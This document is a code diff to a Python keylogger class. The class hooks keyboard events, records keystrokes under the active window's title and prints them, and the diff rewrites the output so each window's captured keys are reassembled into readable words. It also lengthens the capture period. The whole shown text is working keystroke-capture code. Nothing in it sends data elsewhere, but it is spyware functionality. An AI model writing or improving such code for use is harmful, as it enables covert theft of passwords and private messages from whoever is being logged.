@@ -22,12 +22,23 @@ class KeyloggerService:
 
         keyboard.on_release(callback)
 
+
     def getData(self):
-        print("\n נתונים שנאספו:")
+        print("\nData collected:")
         for window, timestamps in self.data.items():
-            print(f"\n🖥 חלון: {window}")
-            for timestamp, keys in timestamps.items():
-                print(f" {timestamp} → {keys}")
+            print(f"\n window: {window}")
+
+            # מחברים את כל התווים למחרוזת אחת
+            all_keys = "".join("".join(keys).replace("space"," ") for keys in timestamps.values())
+
+            # מחלקים למילים לפי רווחים
+            words = all_keys.split()
+
+            # מחברים מחדש עם רווח אחד בין המילים
+            formatted_text = " ".join(words)
+
+            print(formatted_text)
+
 
     def getWindowName(self):
         return pw.getActiveWindowTitle() or "Unknown Window"
@@ -41,7 +52,7 @@ keylogger.getKeyWord()
 
 # מחכים 10 שניות כדי לאסוף נתונים ואז מדפיסים
 
-time.sleep(10)
+time.sleep(25)
 
 # הדפסת הנתונים שנאספו
 keylogger.getData()
